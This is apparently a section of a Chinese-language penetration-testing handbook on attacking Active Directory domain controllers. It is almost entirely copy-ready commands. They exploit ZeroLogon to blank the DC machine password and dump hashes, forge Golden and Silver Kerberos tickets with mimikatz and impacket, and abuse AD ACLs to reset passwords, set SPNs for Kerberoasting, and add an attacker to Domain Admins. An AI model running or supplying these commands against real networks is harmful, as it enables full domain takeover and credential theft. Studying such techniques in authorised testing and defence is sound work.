# 域控攻击

### 12.1 ZeroLogon (CVE-2020-1472)

**原理**：利用 Netlogon 协议中 AES-CMC 加密模式验证缺陷，将全零凭据通过验证，修改域控机器账户密码。

```bash
# 漏洞检测
crackmapexec smb 10.0.0.1 -u '' -p '' -M zerologon

# 利用（将域控机器账户密码置空）
python3 cve-2020-1472-exploit.py 10.0.0.1 DC01

# 置空后导出哈希
impacket-secretsdump -no-pass DC01\$@10.0.0.1

# 恢复域控机器账户密码
python3 cve-2020-1472-scanner.py 10.0.0.1 -restore
```

### 12.3 Golden Ticket 详解

```bash
# 1. 获取 krbtgt 账户 Hash
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt

# 2. 生成黄金票据
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX /krbtgt:KRBTGT_HASH /ticket:golden.kirbi /ptt

# 3. 验证票据
klist

# 4. 访问域控
dir \\DC01.corp.local\c$

# Impacket 生成票据
impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-XXX -domain corp.local Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass corp.local/Administrator@DC01.corp.local
```

### 12.4 Silver Ticket 详解

```bash
# Silver Ticket: 伪造 TGS 票据（不需要与 DC 通信）
# 需要目标服务账户的 Hash

# 1. 获取服务账户 Hash（如 CIFS 服务）
mimikatz # lsadump::dcsync /domain:corp.local /user:DC01$

# 2. 生成白银票据
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-XXX /target:DC01.corp.local /rc4:SERVICE_HASH /service:cifs /ticket:silver.kirbi /ptt

# 3. 访问目标服务
dir \\DC01.corp.local\c$
```

### 12.5 AD ACL 滥用

```powershell
# 使用 PowerView 检查 ACL
# GenericAll 权限：可修改目标用户密码
Get-ObjectAcl -SamAccountName "target_user" -ResolveGUIDs | 
    Where-Object {$_.ActiveDirectoryRights -eq "GenericAll"}

# 滥用 GenericAll 重置密码
Set-DomainUserPassword -Identity "target_user" -AccountPassword (ConvertTo-SecureString "NewP@ss123!" -AsPlainText -Force)

# GenericWrite 权限：可修改属性
# 设置 SPN 实现 Kerberoasting
Set-DomainObject -Identity "target_user" -Set @{serviceprincipalname='fake/SPN'}

# WriteDACL 权限：可修改 ACL
Add-DomainObjectAcl -TargetIdentity "target_user" -PrincipalIdentity "attacker_user" -Rights FullControl

# Self 成员权限：可将自己加入组
Add-DomainGroupMember -Identity "Domain Admins" -Members "attacker_user"
```
